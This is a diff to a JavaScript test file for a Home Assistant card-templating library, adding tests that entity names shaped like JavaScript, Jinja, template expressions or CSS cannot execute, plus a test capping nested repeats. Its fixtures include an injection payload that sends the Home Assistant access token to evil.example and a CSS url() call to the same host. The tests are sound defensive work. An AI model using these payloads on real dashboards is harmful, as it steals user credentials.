@@ -1308,9 +1308,15 @@ const outerBuilt = deepReplace(
   true,
 );
 check(
-  'a nested card is handed the text still escaped, while the rest is written out',
-  outerBuilt.cards.map((card) => card.variables?.[0].label ?? card.content),
-  ['[[!zz?]]', '[[zz?]]'],
+  'a nested card is handed the text still marked, while the rest is written out',
+  outerBuilt.cards.map((card) => {
+    const text = card.variables?.[0].label ?? card.content;
+    return [text.includes('[['), text.replace(/\u2060/g, '')];
+  }),
+  [
+    [false, '[[zz?]]'],
+    [true, '[[zz?]]'],
+  ],
 );
 check(
   'so the nested card reads it as text too, and keeps the key it lands in',
@@ -1338,9 +1344,216 @@ check(
     undefined,
     undefined,
     true,
-  ),
-  [{ label: '[[!zz?]]' }],
+  ).map((entry) => [entry.label.includes('[['), entry.label.replace(/\u2060/g, '')]),
+  [[false, '[[zz?]]']],
 );
+
+/* ----------------------------- Home Assistant text cannot open another language either */
+
+// Review 2026-10-25. Escaping `[[` kept a name from being read as one of this card's
+// placeholders, but the final pass wrote the name back exactly as it was - so a name of
+// `[[[ ... ]]]` reached button-card as JavaScript, `{{ ... }}` reached a markdown card as
+// Jinja, and a `replace:` or `join:` in the chain could take the escape off before then.
+// Home Assistant's text now carries an invisible word joiner around every bracket and
+// brace until the build is done, and keeps one wherever writing it out would open code.
+const WJ = '⁠';
+const naming = {
+  states: {
+    'light.js': {
+      attributes: { friendly_name: "[[[ return fetch('https://evil.example/' + hass.auth.data.access_token) ]]]" },
+    },
+    'light.jinja': {
+      attributes: { friendly_name: '{{ states.lock.front.attributes.code }} and {% if 1 %}x{% endif %}' },
+    },
+    'light.tpl': { attributes: { friendly_name: '${ states["lock.front"].attributes.code }' } },
+    'light.plain': { attributes: { friendly_name: 'Hall [1] {left}' } },
+    'light.brace': { attributes: { friendly_name: 'Hall {left}' } },
+    'light.bang': { attributes: { friendly_name: 'Hi! [[x]]' } },
+    'light.spaced': { attributes: { friendly_name: '[ [zz?]]' } },
+    'light.split': { attributes: { friendly_name: '[,[zz?]]' } },
+    'light.half1': { attributes: { friendly_name: '[' } },
+    'light.half2': { attributes: { friendly_name: '[zz?]]' } },
+    'light.tail': { attributes: { friendly_name: 'foo[' } },
+    'light.head': { attributes: { friendly_name: '[x]]' } },
+    'light.css': { attributes: { friendly_name: 'red;} ha-card{background:url(https://evil.example/p)} x{' } },
+  },
+};
+const named = (entity, field = 'name', extra = {}) =>
+  deepReplace(
+    [{ e: entity }, { x: 'SECRET' }],
+    {},
+    { type: 'custom:button-card', [field]: '[[e|friendly_name]]', ...extra },
+    undefined,
+    naming,
+    true,
+  );
+
+check(
+  'a name shaped like button-card JavaScript cannot start with three brackets',
+  named('light.js').name.startsWith('[[['),
+  false,
+);
+check(
+  'but it still reads as the name, joiner aside',
+  named('light.js').name.replace(new RegExp(WJ, 'g'), ''),
+  "[[[ return fetch('https://evil.example/' + hass.auth.data.access_token) ]]]",
+);
+check(
+  'a name shaped like Jinja opens no Jinja',
+  [/\{\{/.test(named('light.jinja').name), /\{%/.test(named('light.jinja').name)],
+  [false, false],
+);
+check('a name shaped like a config-template-card expression opens none', /\$\{/.test(named('light.tpl').name), false);
+check(
+  'an ordinary name with brackets and braces comes out exactly as written',
+  named('light.plain').name,
+  'Hall [1] {left}',
+);
+check(
+  'a replace: that takes the bang out does not make a placeholder',
+  deepReplace(
+    [{ e: 'light.bang' }, { x: 'SECRET' }],
+    {},
+    { a: '[[e|friendly_name|replace:!:]]' },
+    undefined,
+    naming,
+    true,
+  ).a,
+  'Hi [[x]]',
+);
+check(
+  'a replace: that closes a gap does not make an optional placeholder, and the key stays',
+  deepReplace(
+    [{ e: 'light.spaced' }],
+    {},
+    { confirmation: '[[e|friendly_name|replace: :]]', n: 1 },
+    undefined,
+    naming,
+    true,
+  ),
+  { confirmation: '[[zz?]]', n: 1 },
+);
+check(
+  'a split and an empty join do not make one either',
+  deepReplace(
+    [{ e: 'light.split' }],
+    {},
+    { confirmation: '[[e|friendly_name|split|join:]]', n: 1 },
+    undefined,
+    naming,
+    true,
+  ),
+  { confirmation: '[[zz?]]', n: 1 },
+);
+check(
+  'two names side by side do not form a placeholder',
+  deepReplace(
+    [{ a: 'light.half1' }, { b: 'light.half2' }, { x: 'SECRET' }],
+    {},
+    { confirmation: '[[a|friendly_name]][[b|friendly_name]]', n: 1 },
+    undefined,
+    naming,
+    true,
+  ),
+  { confirmation: '[[zz?]]', n: 1 },
+);
+check(
+  'nor a name ending in a bracket beside one starting with one',
+  deepReplace(
+    [{ a: 'light.tail' }, { b: 'light.head' }, { x: 'SECRET' }],
+    {},
+    { s: '[[a|friendly_name]][[b|friendly_name]]' },
+    undefined,
+    naming,
+    true,
+  ).s,
+  'foo[[x]]',
+);
+check(
+  "nor the author's own bracket beside a name starting with one",
+  deepReplace([{ b: 'light.head' }, { x: 'SECRET' }], {}, { s: '[[[b|friendly_name]]' }, undefined, naming, true).s,
+  '[[x]]',
+);
+check(
+  'a name in a card_mod style is shielded like one in the template style',
+  named('light.css', 'name', {
+    card_mod: { style: 'ha-card { --name: "[[e|friendly_name]]"; }' },
+  }).card_mod.style.includes('url('),
+  false,
+);
+check(
+  'and so is one in a button-card styles block and a legacy style key',
+  [
+    named('light.css', 'name', { styles: { card: [{ color: '[[e|friendly_name]]' }] } }).styles.card[0].color.includes(
+      '}',
+    ),
+    named('light.css', 'name', { style: 'ha-card { color: [[e|friendly_name]] }' }).style.includes('url('),
+  ],
+  [false, false],
+);
+check(
+  'a shielded name is still a name outside the styles',
+  named('light.css').name,
+  'red;} ha-card{background:url(https://evil.example/p)} x{',
+);
+check(
+  'the joiner never reaches a comparison: a condition on a bracketed name still holds',
+  deepReplace(
+    [{ e: 'light.brace' }, { n: '[[e|friendly_name]]' }],
+    {},
+    { a: '[[n|if:n=Hall {left}]]' },
+    undefined,
+    naming,
+    true,
+  ).a,
+  'Hall {left}',
+);
+check(
+  'a value handed to a nested card keeps its joiners, and that card writes the name out',
+  (() => {
+    const outer = deepReplace(
+      [{ e: 'light.js' }],
+      {},
+      { type: 'custom:decluttering-card-plus', template: 'inner', variables: [{ label: '[[e|friendly_name]]' }] },
+      undefined,
+      naming,
+      true,
+    );
+    const inner = deepReplace(outer.variables, {}, { name: '[[label]]' }, undefined, naming, true);
+    return [
+      outer.variables[0].label.includes(WJ),
+      inner.name.startsWith('[[['),
+      inner.name.replace(new RegExp(WJ, 'g'), '').startsWith('[[['),
+    ];
+  })(),
+  [true, false, true],
+);
+
+{
+  // Review 2026-10-25. A repeat inside a repeat over a long list is as many builds as the
+  // product of the two, and used to run them all before the size ceiling saw the result.
+  const items = Array.from({ length: 200 }, (_, i) => ({ item: `x${i}` }));
+  const started = Date.now();
+  const out = deepReplace(
+    [{ list: items }, { inner: { a: '[[item]] [[inner2|repeat:list]]' } }, { inner2: { b: '[[item]]' } }],
+    {},
+    { rows: '[[inner|repeat:list]]' },
+    undefined,
+    undefined,
+    true,
+  );
+  check(
+    'a repeat inside a repeat stops after two thousand copies rather than building forty thousand',
+    [Array.isArray(out.rows), Date.now() - started < 2000],
+    [true, true],
+  );
+  check(
+    'a repeat that fits is unaffected',
+    deepReplace([{ list: items.slice(0, 50) }, { inner: { a: '[[item]]' } }], {}, { rows: '[[inner|repeat:list]]' })
+      .rows.length,
+    50,
+  );
+}
 
 /* ------------------------------------------------------------ arithmetic */
 
